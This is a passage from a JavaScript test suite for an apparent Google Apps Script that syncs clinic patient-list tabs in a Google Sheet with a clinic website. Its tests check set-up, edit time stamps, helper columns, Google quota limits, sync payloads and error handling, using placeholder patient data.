  assert.deepEqual(probe.p_payload, { date: TODAY, check_removed: false, tabs: [] });
});

test('Set up skips a tab that is missing or whose first row is not the list header, tells which, and carries on with the others', () => {
  const { env } = world({ tabs: [GUL, 'Islamabad'], patients: ALL_PATIENTS, install: false, helpers: false });
  env.tab('Islamabad').cells.clear();
  env.tab('Islamabad')._set(1, 1, { kind: 's', v: 'Aaj ki List' });
  scripted(env);
  env.ctx.aajSetup();
  const texts = env.dialogs.map((d) => d.text);
  assert.ok(texts.includes('The tab "North Nazimabad" was not found. It is skipped.'));
  assert.ok(texts.includes('Islamabad: row 1 does not look like the list header. This tab is skipped.'));
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(env.props.document.get('listDate:Islamabad'), undefined);
  assert.equal(env.tab('Islamabad').text(1, 2), '', 'a tab that is not a list is not given helper columns');
  assert.equal(ours(env).length, 4);
});

test('"Sync now" before Set up tells the person to run Set up; after Set up it runs one tick at any hour', () => {
  const { env, server } = world({ install: false, helpers: false, at: '03:00' });
  env.responder = () => 'OK';
  env.ctx.aajSyncNow();
  assert.match(env.dialogs[0].text, /Run "Set up or repair \(Dr\. Ali\)" first\./);
  assert.equal(server.calls.length, 0);
  const w = world({ at: '03:00', patients: BASE_PATIENTS });
  w.env.advance(61000);
  w.env.ctx.aajSyncNow();
  w.env.ctx.aajSyncNow();
  assert.ok(w.server.calls.length >= 1, 'Sync now works at 03:00 (the clock-only trigger would not)');
});

// ------------------------------------------------------------------------------------------------ the on-edit trigger
test('on edit: every edited patient row gets a plain-text time stamp (never "1.76E+12"); header, helper columns and other tabs are ignored; it never throws', () => {
  const { env } = world({ tabs: [GUL], patients: BASE_PATIENTS });
  env.addTab('Patient Response', [['Timestamp', 'Patient Name'], ['x', 'y']]);
  const stampCol = colOf(env, GUL, 'sync edited');
  const sh = env.tab(GUL);
  env.at(TODAY, '09:30');
  const t0 = env.clock.ms;
  env.type(GUL, 3, 3, '7');
  const stamp = Number(sh.text(3, stampCol));
  assert.ok(stamp >= t0 && stamp <= env.clock.ms, 'the time of the edit');
  assert.equal(sh.kind(3, stampCol), 's', 'text, so a 13-digit number cannot turn into scientific notation');
  assert.match(sh.text(3, stampCol), /^\d{13}$/);
  assert.equal(sh.text(2, stampCol), '', 'other rows untouched');
  // a pasted block of three rows
  env.advance(5000);
  env.type(GUL, 4, 2, [['A', 'B'], ['C', 'D'], ['E', 'F']]);
  assert.ok(Number(sh.text(4, stampCol)) > stamp);
  for (const r of [5, 6]) assert.equal(sh.text(r, stampCol), sh.text(4, stampCol), 'one stamp for the whole paste');
  assert.equal(sh.text(7, stampCol), '');
  // ignored edits
  const before = sh.text(2, stampCol);
  env.type(GUL, 1, 2, 'Patient Name');
  env.type(GUL, 2, colOf(env, GUL, 'website'), 'x');
  env.type(GUL, 2, colOf(env, GUL, 'sync key'), 'S-000000000000');
  assert.equal(sh.text(1, stampCol), 'Sync edited');
  assert.equal(sh.text(2, stampCol), before);
  const calls = [];
  const orig = env.Sheet.prototype.getRange;
  env.Sheet.prototype.getRange = function (...a) { calls.push(this.name); return orig.apply(this, a); };
  env.type('Patient Response', 2, 2, 'edited');
  env.Sheet.prototype.getRange = orig;
  assert.ok(!calls.filter((n) => n === 'Patient Response').length || calls.every((n) => n === 'Patient Response'), 'only the typing itself touched it');
  assert.equal(env.tab('Patient Response').text(1, 3), '');
  // never throws
  for (const bad of [undefined, null, {}, { range: null }, { range: { getSheet() { throw new Error('boom'); } } }, { range: { getSheet: () => ({ getName: () => GUL, getLastColumn: () => { throw new Error('boom'); } }), getRow: () => 3, getNumRows: () => 1, getColumn: () => 1, getNumColumns: () => 1 } }]) {
    assert.doesNotThrow(() => env.ctx.aajOnEdit(bad));
  }
  // a tab that has no helper columns yet
  const bare = createEnv();
  bare.addTab(GUL, [fixture.headers[GUL], fx(GUL, 0)]);
  assert.doesNotThrow(() => bare.ctx.aajOnEdit({ range: new bare.Range(bare.tab(GUL), 2, 3, 1, 1) }));
  assert.equal(bare.tab(GUL).used().cols, 13);
});

// ------------------------------------------------------------------------------------------------ helper columns and layout changes
test('the helper columns are made once, right after the last header (NN: after Column 16), the last three hidden; a tab with no spare columns gets room', () => {
  const { env } = world({ tabs: ['North Nazimabad', GUL], patients: [], helpers: false });
  env.tab(GUL).maxCols = 13;
  env.ticks(3);
  const nn = env.tab('North Nazimabad'), gul = env.tab(GUL);
  assert.equal(nn.used().cols, 20);
  assert.equal(gul.used().cols, 17);
  assert.ok(gul.maxCols >= 17, 'columns were added to make room');
  assert.equal(nn.text(1, 17).startsWith('Website'), true);
  assert.deepEqual([...nn.hidden].sort((a, b) => a - b), [18, 19, 20]);
  const colsAfter = [nn.used().cols, gul.used().cols];
  env.ticks(5);
  assert.deepEqual([nn.used().cols, gul.used().cols], colsAfter, 'not added again');
  assert.equal(nn.hidden.size, 3);
});

test('helper columns are found by their header text wherever they are (moved, reordered, blank column between them); none are added', () => {
  const { env, server } = world({ patients: BASE_PATIENTS, helpers: false });
  const sh = env.tab(GUL);
  [['Sync edited', 14], ['', 15], ['Website', 16], ['Sync base', 17], ['Sync key', 18]].forEach(([h, c]) => { if (h) sh._set(1, c, { kind: 's', v: h }); });
  sh.maxCols = 30;
  settle(env, 3);
  assert.equal(sh.used().cols, 18, 'no extra column');
  assert.equal(server.state.visits.length + server.state.checkups.length, 6);
  assert.equal(sh.text(2, 16), '✓ On website');
  assert.match(sh.text(2, 18), /^S-/);
  quiet(env, server);
});

test('a deleted key/base column is recreated; the rows get new keys and adopt their own visits: nothing doubles, nothing is lost', () => {
  const { env, server } = synced();
  const keyC = colOf(env, GUL, 'sync key'), baseC = colOf(env, GUL, 'sync base');
  const sh = env.tab(GUL);
  const visits = server.state.visits.map((v) => v.id).sort();
  for (let r = 1; r <= 12; r++) { sh._set(r, keyC, null); sh._set(r, baseC, null); }
  env.touch();
  env.ticks(4);
  assert.equal(sh.text(1, sh.used().cols - 1).length > 0, true);
  assert.equal(server.state.visits.length, visits.length, 'no visit created');
  assert.deepEqual(server.state.visits.map((v) => v.id).sort(), visits, 'the same visits');
  const keys = keysOf(env, GUL);
  assert.equal(keys.length, 6);
  for (const v of server.state.visits) assert.ok(keys.includes(v.sheet_key), 'each visit now carries the new key of its row');
  assert.ok(server.state.visits.every((v) => v.status !== 'cancelled'));
  quiet(env, server);
});

test('a renamed header, a column inserted in the middle, a header with odd spacing: columns follow their header, nothing is re-sent or rewritten', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  // insert a column before "Doctor Name": everything to its right moves one column right
  const at = colOf(env, GUL, 'doctor');
  const moved = [...sh.cells.entries()].map(([k, v]) => [k.split(',').map(Number), v]);
  sh.cells.clear(); sh.maxCols += 1;
  for (const [[r, c], v] of moved) sh.cells.set(r + ',' + (c >= at ? c + 1 : c), v);
  sh._set(1, at, { kind: 's', v: 'Notes' });
  sh._set(1, colOf(env, GUL, 'token'), { kind: 's', v: ' Token   Number ' });
  const st = server.calls.length;
  quiet(env, server);
  assert.equal(server.calls.slice(st).every((c) => c.payload.tabs[0].rows.length === 0), true);
  // and the sync still reads the right columns
  setCell(env, GUL, 2, 'doctor', 'Dr. Ali Rashid');
  env.tickAfter(5000);
  assert.deepEqual(webVisit(server, 'Sample Person One').doctors.slice().sort(), ['c-ali']);
  server.editVisit(webVisit(server, 'Sample Person One').id, { token: 21 });
  env.tickAfter(61000);
  assert.equal(cellOf(env, GUL, 2, 'token'), '21');
});

// ------------------------------------------------------------------------------------------------ the other tabs, Google's limits
const DECOYS = () => ({
  'Website - Gulshan KHI': [['Copied from dralirashid.com for 2026-10-09 at 01:45. Do not edit here; edit on the website.'], ['Mr#', 'Name', 'Status'], ['9701', 'Sample Person One', 'Completed']],
  'Copy of DHA KHI': [fixture.headers['DHA KHI'], ...fixture.rows['DHA KHI']],
  'Patient Response': [['Timestamp', 'Patient Name', 'Which branch did you visit?'], ['2026-10-08 12:00', 'Sample Person One', 'GUL']],
  'Sheet42': [['8060.0', 'Sample Person Two', '12', 'Monthly', '51.0', 'Treatment', '', 'Dr Aimon Aslam', 'U L 018', '0.0', 'Done']],
  'Sheet45': [['Work List', 'Frequency'], ['Clean chairs', 'Daily']],
  'Daily Work': [['Clinic Coordinator', 'Receptionist'], ['A', 'B']],
  'Staff Duties': [['Clinic Work', 'Primary Employees'], ['Reports', 'C']],
});
const snapshotOf = (env, names) => JSON.stringify(names.map((n) => { const s = env.tab(n); return [n, [...s.cells.entries()], [...s.fonts.entries()], [...s.hidden], s.maxRows, s.maxCols]; }));

test('tabs that are not patient lists ("Website - ...", "Copy of DHA KHI", "Patient Response", Sheet42...) are never read, written, hidden, cleared or archived: through a day, midnight and Set up', () => {
  const { env, server } = world({ tabs: ['DHA KHI', GUL], patients: [...ALL_PATIENTS, { mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }], install: false, helpers: false });
  for (const [n, rows] of Object.entries(DECOYS())) env.addTab(n, rows);
  const decoyNames = Object.keys(DECOYS());
  const before = snapshotOf(env, decoyNames);
  const touched = new Set();
  for (const m of ['getRange', 'insertColumnsAfter', 'insertRowsAfter', 'hideColumns', 'deleteRows']) {
    const orig = env.Sheet.prototype[m];
    env.Sheet.prototype[m] = function (...a) { touched.add(this.name); return orig.apply(this, a); };
  }
  scripted(env);
  env.ctx.aajSetup();
  env.ticks(3);
  env.at(TODAY, '12:00'); env.type('DHA KHI', 5, 2, 'Typed Today'); env.ticks(3);
  env.at(NEXT, '00:05'); env.ticks(2);
  env.at(NEXT, '09:00'); env.ticks(3);
  assert.equal(snapshotOf(env, decoyNames), before, 'not a cell, colour, hidden column or size changed');
  for (const n of decoyNames) assert.ok(!touched.has(n), `${n} was never accessed`);
  assert.ok([...touched].every((n) => ['DHA KHI', GUL, 'Aaj Sync log', 'Aj ki List - Archive', 'Sheet1', 'Aj ki List checkups'].includes(n) || n === 'DHA KHI' || n === GUL), [...touched].join());
  assert.ok(!archiveSheet(env, 'Copy of DHA KHI'), 'no archive tab for the copy');
});

test('a tab that is renamed or missing is skipped and logged once a day; the other tabs keep syncing', () => {
  const { env, server } = world({ tabs: [GUL, 'Islamabad'], patients: [...ALL_PATIENTS] });
  env.tab(GUL).name = 'Gulshan KHI (old)';
  settle(env, 4);
  const log = env.tab('Aaj Sync log').values().map((r) => r[3]).filter((t) => /was not found/.test(t));
  assert.equal(log.filter((t) => t.includes('Gulshan KHI')).length, 1, 'once, not every minute');
  assert.equal(server.visitsOf('ISB', TODAY).length, 2, 'Islamabad kept syncing');
});

test('runtime guard: past 50 minutes of run time today the script works only every 5th minute; past 65 it stops for the day and says so; tomorrow it starts again', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  settle(env, 2);
  // L8 (loop 3): Google counts more than the script sees (each run's start-up too), so the script stops well before the 90 minutes
  assert.equal(env.global('AAJ').RUNTIME_SLOW_MS, 50 * 60000);
  assert.equal(env.global('AAJ').RUNTIME_STOP_MS, 65 * 60000);
  env.props.document.set('rt:' + TODAY, String(3100000));
  const fetched = [];
  for (const m of ['08:11', '08:12', '08:13', '08:14', '08:15', '08:16', '08:20']) {
    env.at(TODAY, m);
    const f0 = env.stats.fetches;
    env.tick();
    fetched.push([m, env.stats.fetches - f0]);
  }
  assert.deepEqual(fetched.filter(([, n]) => n > 0).map(([m]) => m), ['08:15', '08:20'], 'slow mode: every 5th minute only');
  env.at(TODAY, '08:21');
  setCell(env, GUL, 2, 'treatment details', 'x');
  env.props.document.set('rt:' + TODAY, String(4000000));
  const f1 = env.stats.fetches;
  env.tick();
  assert.equal(env.stats.fetches, f1, 'stopped');
  assert.equal(headerOf(env, GUL), 'Website · paused for today (Google time limit). Use the website.');
  const writes = env.stats.calls.write;
  env.at(TODAY, '08:22'); env.tick(); env.at(TODAY, '08:25'); env.tick();
  assert.equal(env.stats.calls.write, writes, 'the pause message is written once');
  assert.equal(env.stats.fetches, f1);
  env.at(NEXT, '08:00');
  env.props.document.set('listDate:' + GUL, NEXT);
  env.ticks(2);
  assert.ok(env.stats.fetches > f1, 'a new day starts again');
  assert.ok(![...env.props.document.keys()].some((k) => k === 'rt:' + TODAY || k === 'paused:' + TODAY), 'old counters are removed');
});

test('run time is counted: the day\'s total in "rt:" grows by what each tick took; "Sync now" is not held back by the slow mode', () => {
  const { env } = world({ patients: BASE_PATIENTS });
  const runs = env.ticks(3);
  const total = runs.reduce((a, t) => a + t.ms, 0);
  assert.ok(Math.abs(Number(env.props.document.get('rt:' + TODAY)) - total) < 5, 'rt ' + env.props.document.get('rt:' + TODAY) + ' vs ' + total);
  env.props.document.set('rt:' + TODAY, String(5200000));
  const f = env.stats.fetches;
  env.at(TODAY, '08:07');
  env.ctx.aajSyncNow();
  assert.ok(env.stats.fetches > f, 'manual run goes ahead');
});

// ------------------------------------------------------------------------------------------------ contract, odd rows, Google errors
test('what a sheet edit sends: a linked row carries only the changed cells, the canonical text the script last received as "base", and the edit time', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const before = env.clock.ms;
  setCell(env, GUL, r, 'waiting', 'Treatment');
  setCell(env, GUL, r, 'doctor', 'Dr. Samrah Khan, Hira Anis');
  env.tickAfter(10000);
  const call = server.calls[server.calls.length - 1];
  const row = call.payload.tabs[0].rows[0];
  const stamp = row.edited_at;
  assert.ok(stamp >= before && stamp <= env.clock.ms);
  assert.deepEqual(row, {
    key: webVisit(server, 'Sample Person One').sheet_key, new: false, edited_at: stamp,
    set: { status: { t: 'Treatment', v: 'in_treatment' }, doctors: { t: 'Dr. Samrah Khan, Hira Anis', v: ['Dr. Samrah Khan', 'Hira Anis'] } },
    base: { status: 'Completed', doctors: ['Dr Haniya', 'Dr. Samrah Khan'] },
  });
  assert.equal(call.payload.tabs[0].hash.length, 32, 'the hash from the previous answer');
  assert.equal(env.fetchLog[env.fetchLog.length - 1].params.contentType, 'application/json');
});

test('a new row sends every non-empty cell, the cleaned name AND what was typed, the Mr# cell as typed (or NEW or empty)', () => {
  const { env, server } = synced();
  env.typeRow(GUL, 8, ['NEW', 'sample WALK lhr ', '04 Photo', 'Zirconia', 'Kit 55k', 'Waiting', 'Group 4', 'Dr Verda, Dr. Unknown', 'U L 018', '35k', 'Done', '0300 1119999 / 0321 1118888', 'Called']);
  env.tickAfter(61000);
  const row = rowsSent(server).find((x) => x.set.name === 'Sample Walk');
  assert.deepEqual(row.set, {
    mr: 'NEW', name: 'Sample Walk', legacy_name: 'sample WALK lhr', phone: '03001119999', month: { t: '04 Photo', v: 4 }, treatment: 'Zirconia',
    token: { t: 'Kit 55k', v: null }, status: { t: 'Waiting', v: 'waiting' }, group: { t: 'Group 4', v: null }, doctors: { t: 'Dr Verda, Dr. Unknown', v: ['Dr Verda', 'Dr. Unknown'] },
    details: 'U L 018', pp: '35k', healthwire: 'Done', reminder: 'Called',
  });
  assert.equal(row.new, true);
  assert.equal(row.base, undefined);
});

test('a doctor typed in the Token cell ("Dr Verda" on two Islamabad rows) is not lost: the token stays text, the doctor goes to the visit', () => {
  const { env, server } = world({ tabs: ['Islamabad'], patients: ALL_PATIENTS });
  settle(env, 3);
  const r = rowOf(env, 'Islamabad', 'Sample Person Fifteen');
  assert.equal(cellOf(env, 'Islamabad', r, 'token'), 'Dr Verda', 'the cell is left as typed');
  const v = webVisit(server, 'Sample Person Fifteen');
  assert.deepEqual(v.doctors, ['c-warda'], 'but the visit has the doctor');
  assert.equal(v.cells.token.v, null);
  assert.ok(v.token !== 0, 'the website numbered its own token');
  const kit = webVisit(server, 'Sample Person Fourteen');
  assert.deepEqual(kit.doctors, ['c-warda'], 'the doctor cell of this row says Dr Verda too');
  assert.equal(cellOf(env, 'Islamabad', rowOf(env, 'Islamabad', 'Sample Person Fourteen'), 'token'), 'Kit 80k');
  quiet(env, server);
});

test('Lahore: kit text and "4 Zirconia" in the Token column, "Group 2, Group 1", a photo month: all kept as typed; the first group 1-3 goes to the website', () => {
  const { env, server } = world({ tabs: ['Gulberg Lhr'], patients: ALL_PATIENTS });
  settle(env, 3);
  const v = webVisit(server, 'Sample Person Eleven');
  assert.equal(v.group, 2, '"Group 2, Group 1": the first group');
  assert.equal(v.braces_month, 6);
  assert.equal(cellOf(env, 'Gulberg Lhr', 2, 'month'), '6 Photo');
  assert.equal(cellOf(env, 'Gulberg Lhr', 2, 'token'), 'Kit 80k');
  assert.equal(cellOf(env, 'Gulberg Lhr', 2, 'group'), 'Group 2, Group 1');
  assert.equal(cellOf(env, 'Gulberg Lhr', 3, 'token'), '4 Zirconia');
  assert.equal(webVisit(server, 'Sample Person Thirteen').status, 'in_treatment', '"In treatment" is not "Completed"');
  quiet(env, server);
});

test('a Mr# cell that is not a number ("98 51") is not sent and says what to do; fixing it sends the row', () => {
  const rows = [['98 51', 'Sample Person One', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110001', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.equal(rowsSent(server).length, 0);
  assert.equal(statusOf(env, GUL, 2), '\u2717 "98 51" is not a Mr#. Type the number only, or leave it empty.');
  setCell(env, GUL, 2, 'mr', '9701');
  env.tickAfter(61000);
  assert.equal(rowsSent(server).length, 1);
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
});

test('a tab with more than 400 patient rows is not sent: the header says to archive or clear old rows', () => {
  const rows = [];
  for (let i = 0; i < 401; i++) rows.push(['', `Walk ${i}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0300${String(1000000 + i).slice(1)}`, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  env.tab(GUL).maxRows = 600;
  settle(env, 3);
  assert.equal(server.calls.length, 0);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \u2717 \d\d:\d\d more than 400 rows: archive or clear old rows$/);
});

test('a row that keeps failing is reported once in the log, not every minute', () => {
  const rows = [['9701', 'Sample Person One', '', 'Checkup', '1', 'Waiting', '', '', 'x'.repeat(600), '', '', '03001110001', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  env.ticks(1); env.advance(61000); env.ticks(6);
  env.advance(5 * 60000); env.ticks(1);
  assert.ok(rowsSent(server).length >= 2, 'it is sent again at the next full read (every five minutes), and at once when somebody edits it');
  const lines = env.tab('Aaj Sync log').values().filter((r) => /Too long/.test(r[3]));
  assert.equal(lines.length, 1);
  assert.equal(lines[0][2], 'Sample Person One');
  setCell(env, GUL, 2, 'treatment details', 'fixed');
  env.tickAfter(61000);
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
});

test('the log tab keeps the newest 2,000 lines', () => {
  const { env } = world({});
  const ctx = env.ctx;
  const mk = (n) => { const c = ctx.aajNewCtx_(ctx.aajLoadState_(), false); for (let i = 0; i < n; i++) ctx.aajLog_(c, GUL, 'p' + i, 'line ' + i); ctx.aajFlushLog_(c); };
  mk(2150); mk(100); mk(100);
  const sh = env.tab('Aaj Sync log');
  assert.ok(sh.used().rows <= 2000 + 200 + 1, 'rows ' + sh.used().rows);
  assert.ok(sh.used().rows >= 2000);
  assert.equal(sh.text(1, 1), 'Time');
  assert.equal(sh.text(sh.used().rows, 4), 'line 99', 'the newest line is last');
});

test('Google errors in the middle of a run never escape: the lock is released, the problem is logged, the next tick works', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.ticks(1);
  const orig = env.Range.prototype.getDisplayValues;
  env.Range.prototype.getDisplayValues = function () { env.Range.prototype.getDisplayValues = orig; throw new Error('Service invoked too many times for one day: spreadsheet.'); };
  assert.doesNotThrow(() => env.tickAfter(61000));
  assert.equal(env.lockHeld, false);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Sync error: Service invoked too many times/);
  env.ticks(2);
  assert.equal(server.state.visits.length, 3);
});

test('Open the archive and Help show something useful', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05'); env.ticks(1);
  env.responder = () => 'OK';
  env.ctx.aajShowArchive();
  assert.match(env.dialogs[env.dialogs.length - 1].text, /^The archive is here:\nhttps:\/\/docs\.google\.com\/spreadsheets\/d\/book-\d+\/edit$/);
  env.ctx.aajHelp();
  const help = env.dialogs[env.dialogs.length - 1].text;
  for (const bit of ['checkup', 'Deleting a row', 'Completed', 'hidden columns', 'the table\'s menu', 'Sort A to Z', '10 minutes', 'archive']) assert.ok(help.includes(bit), bit);
  const w = world({ install: false, helpers: false });
  w.env.responder = () => 'OK';
  w.env.ctx.aajShowArchive();
  assert.match(w.env.dialogs[0].text, /no archive yet/);
});

test('a header that was overwritten (row 1 no longer looks like the list): that tab is skipped and logged; the others carry on', () => {
  const { env, server } = world({ tabs: [GUL, 'Islamabad'], patients: ALL_PATIENTS });
  settle(env, 2);
  env.tab(GUL)._set(1, 2, { kind: 's', v: 'oops' });
  env.tab(GUL)._set(1, 4, { kind: 's', v: 'oops' });
  server.addPatient({ mr: '9740', name: 'Isb Walker', phone: '03001110740' });
  server.addVisit({ branch: 'ISB', date: TODAY, mr: '9740' });
  assert.doesNotThrow(() => env.ticks(2));
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Gulshan KHI: row 1 does not look like the list header\. This tab is skipped\./);
  assert.ok(rowOf(env, 'Islamabad', 'Isb Walker'));
});

test('Karachi time, not the time zone of the script project: at 00:05 in Karachi (still the previous day in UTC) the night work starts', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  assert.equal(new Date(env.clock.ms).toISOString().slice(0, 10), TODAY, 'UTC still says yesterday');
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  env.at(TODAY, '23:50');
  assert.equal(new Date(env.clock.ms).toISOString().slice(0, 10), TODAY);
});

// ------------------------------------------------------------------------------------------------ how long a run takes
function bigWorld(perTab = 100) {
  const patients = [], rows = {};
  let n = 0;
  for (const tab of TABS) {
    rows[tab] = [];
    for (let i = 0; i < perTab; i++, n++) {
      const phone = `0311${String(1000000 + n).slice(1)}`;
      patients.push({ mr: String(30000 + n), name: `Patient ${n}`, phone });
      rows[tab].push([String(30000 + n), `Patient ${n}`, '', 'Monthly', String(i + 1), 'Waiting', 'Group 1', 'Dr Haniya', 'U L 018', '', '', phone, '']);
    }
  }
  const w = world({ tabs: TABS, patients, rows });
  for (const t of TABS) w.env.tab(t).maxRows = 400;
  return w;
}

test('5 tabs x 100 rows: the first sync stays far below Google\'s 6 minutes (20 calls of 25 rows), and then a quiet minute costs about a second', () => {
  const { env, server } = bigWorld(100);
  const stamp = env.ticks(1)[0];
  assert.equal(server.state.visits.length, 0, 'the first tick only stamps the rows');
  env.advance(61000);
  const heavy = env.ticks(1)[0];
  assert.equal(server.state.visits.length, 500, 'all 500 rows are on the website');
  assert.equal(heavy.calls, 20, '500 rows / 25 = 20 calls');
  assert.ok(heavy.ms < 120000, `the biggest possible run took ${(heavy.ms / 1000).toFixed(1)} s (limit 360 s, soft stop 240 s)`);
  console.log(`    first sync of 500 rows: ${(heavy.ms / 1000).toFixed(1)} s simulated; stamp tick ${(stamp.ms / 1000).toFixed(1)} s`);
  const quietRuns = env.ticks(5);
  const avg = quietRuns.reduce((a, t) => a + t.ms, 0) / quietRuns.length;
  const worst = Math.max(...quietRuns.map((t) => t.ms));
  assert.ok(quietRuns.every((t) => t.calls === 1 && t.rows === 0 && t.writes === 0), 'idle: one call, no rows, no writes');
  assert.ok(avg < 3000, `an idle tick takes ${avg.toFixed(0)} ms on average`);
  assert.ok(worst < 6000);
  // a whole day: about 1,000 ticks from 08:00 to 23:59 (plus the night ticks that only look at the clock)
  const hours = (avg * 960) / 3600000;
  console.log(`    quiet tick ${avg.toFixed(0)} ms -> ${(hours * 60).toFixed(0)} min of the 90 allowed per day`);
  assert.ok(hours * 60 < 45, 'a full day of ticks stays far below the 90 minutes a free Google account gets');
  // a busy minute: one website change and one sheet edit
  server.editVisit(server.state.visits[5].id, { details: 'changed on the website' });
  env.type('Islamabad', 3, 9, 'changed in the sheet');
  const busy = env.tickAfter(61000);
  assert.ok(busy.ms < 8000, `a minute with two changes took ${busy.ms} ms`);
  assert.equal(server.state.visits.find((v) => v.details === 'changed in the sheet') !== undefined, true);
});

test('the soft stop: when every call is slow the run stops sending after 4 minutes, finishes what came back, and the next minute carries on; no row is lost or doubled', () => {
  const rows = [], patients = [];
  for (let i = 0; i < 200; i++) {
    patients.push({ mr: String(40000 + i), name: `Walk In ${i + 1}`, phone: `0301${String(4000000 + i).slice(1)}` });
    rows.push([String(40000 + i), `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(4000000 + i).slice(1)}`, '']);
  }
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  env.tab(GUL).maxRows = 400;
  env.cost.fetch = 100000;                                  // 100 s per call
  env.ticks(1);
  env.advance(61000);
  const n0 = server.calls.length;
  const t1 = env.ticks(1)[0];
  assert.ok(t1.ms < 360000, `run took ${(t1.ms / 1000).toFixed(0)} s: under Google\'s 6 minutes`);
  assert.equal(t1.calls, 3, 'it stopped starting new calls after 240 s');
  assert.equal(server.state.visits.length, 75);
  assert.ok(server.calls.slice(n0).every((c) => c.payload.check_removed === false), 'no removal check until the last batch has been sent');
  let guard = 0;
  while (server.state.visits.length < 200 && guard++ < 6) env.ticks(1);
  assert.equal(server.state.visits.length, 200);
  assert.equal(server.state.patients.length, 200, 'one patient per row: nothing created twice');
  assert.equal(new Set(server.state.visits.map((v) => v.sheet_key)).size, 200);
  assert.equal(server.calls[server.calls.length - 1].payload.check_removed, true, 'the last batch asks for the removal check');
});

// ------------------------------------------------------------------------------------------------ people, sorting, copying
test('a phone shared by a family never picks a patient: with no Mr# a row is a checkup, nobody is linked, no patient file is made', () => {
  const rows = [
    ['', 'Ayesha Khan', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03009990001', ''],
    ['', 'Bilal Khan', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03009990002', ''],
    ['', 'Umer', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows } });
  server.addPatient({ mr: '9801', name: 'Ayesha Khan', phone: '03009990001' });
  server.addPatient({ mr: '9802', name: 'Ayesha Khan', phone: '03009990001' });
  server.addPatient({ mr: '9803', name: 'Sadia Khan', phone: '03009990002' });
  server.addPatient({ mr: '9804', name: 'Umer Farooq', phone: '03009990004' });
  settle(env, 3);
  assert.equal(server.state.patients.length, 4, 'no patient was made');
  assert.equal(server.state.visits.length, 0, 'and nobody was picked: no visit');
  assert.equal(server.state.checkups.length, 3);
  for (let r = 2; r <= 4; r++) assert.equal(statusOf(env, GUL, r), '\u2713 Checkup patient: no Mr#, no patient file.');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '');
  assert.equal(server.state.checkups[0].patient_mr, null);
});

test('Sort sheet (whole rows, hidden columns move too): nothing changes anywhere, nothing is sent', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const width = sh.used().cols;
  const rows = [];
  for (let r = 2; r <= 7; r++) rows.push([...sh.cells.entries()].filter(([k]) => k.startsWith(r + ',')).map(([k, v]) => [Number(k.split(',')[1]), v, sh.fonts.get(k)]));
  rows.reverse();
  for (let r = 2; r <= 7; r++) for (let c = 1; c <= width; c++) { sh.cells.delete(r + ',' + c); sh.fonts.delete(r + ',' + c); }
  rows.forEach((cells, i) => cells.forEach(([c, v, f]) => { sh.cells.set((i + 2) + ',' + c, v); if (f) sh.fonts.set((i + 2) + ',' + c, f); }));
  env.touch();
  assert.equal(sh.text(2, 2), 'Sample Person Six', 'the order did change');
  const visits = JSON.stringify(server.state.visits.map((v) => [v.id, v.status, v.details]));
  quiet(env, server);
  assert.equal(JSON.stringify(server.state.visits.map((v) => [v.id, v.status, v.details])), visits);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
});

test('a row copied into another branch\'s tab is a new row there: it gets its own key and a visit of that branch; the first branch is not disturbed', () => {
  const { env, server } = world({ tabs: [GUL, 'North Nazimabad'], patients: ALL_PATIENTS, rows: { 'North Nazimabad': [] } });
  settle(env, 3);
  const g = env.tab(GUL), n = env.tab('North Nazimabad');
  const r = rowOf(env, GUL, 'Sample Person One');
  const gk = colOf(env, GUL, 'sync key'), nk = colOf(env, 'North Nazimabad', 'sync key');
  const wid = colOf(env, GUL, 'website') - 1;
  for (let c = 1; c <= wid; c++) if (g.text(r, c)) n._set(2, c, g._get(r, c));
  n._set(2, nk, g._get(r, gk)); n._set(2, nk + 1, g._get(r, gk + 1)); n._set(2, nk + 2, g._get(r, gk + 2));
  env.touch();
  env.ticks(3);
  const keyN = n.text(2, nk), keyG = g.text(r, gk);
  assert.notEqual(keyN, keyG, 'the copy was given a key of its own');
  assert.equal(server.visitsOf('NN', TODAY).filter((v) => v.mr === '9701').length, 1, 'a visit of the other branch');
  assert.equal(server.visitsOf('GUL', TODAY).filter((v) => v.mr === '9701').length, 1);
  assert.equal(webVisit(server, 'Sample Person One') && server.visitsOf('GUL', TODAY).find((v) => v.mr === '9701').sheet_key, keyG);
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  assert.match(n.text(2, colOf(env, 'North Nazimabad', 'website')), /^[✓⚠]/);
});

test('a run that dies half way (Google stops it) still has its time counted for the day', () => {
  const { env } = world({ patients: BASE_PATIENTS });
  env.ticks(1);
  const before = Number(env.props.document.get('rt:' + TODAY));
  const orig = env.Range.prototype.getDisplayValues;
  env.Range.prototype.getDisplayValues = function () { env.charge('boom', 5000); throw new Error('Exceeded maximum execution time'); };
  env.tickAfter(61000);
  env.Range.prototype.getDisplayValues = orig;
  const after = Number(env.props.document.get('rt:' + TODAY));
